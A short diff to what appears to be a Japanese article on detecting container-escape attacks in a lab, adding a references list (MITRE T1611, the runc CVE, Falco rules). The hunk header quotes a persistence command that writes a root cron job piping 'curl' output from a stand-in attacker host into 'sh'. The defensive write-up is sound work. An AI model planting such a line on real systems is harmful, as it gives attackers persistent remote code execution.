@@ -103,3 +103,10 @@ echo "* * * * * root curl http://attacker.example/beacon | sh" >> /etc/cron.d/sy
 | 12 | ホスト到達後の初動（永続化） | ✅ 検知 | ホスト向けの一般的な検知ロジックがそのまま有効 |
 
 Container Escapeフェーズは3本とも検知に成功しましたが、これは**ラボで用意した手法が比較的よく知られたパターンだったため**でもあります。次章では、エスケープせずともクラスタ内で広がっていく「Lateral Movement」を扱います。
+
+## 参考資料
+
+- [MITRE ATT&CK T1611: Escape to Host](https://attack.mitre.org/techniques/T1611/)
+- [CVE-2019-5736（runc）- NVD](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
+- [Falco Default Rules（falcosecurity/rules）](https://github.com/falcosecurity/rules)
+- [Linux namespaces(7) — manual page](https://man7.org/linux/man-pages/man7/namespaces.7.html)
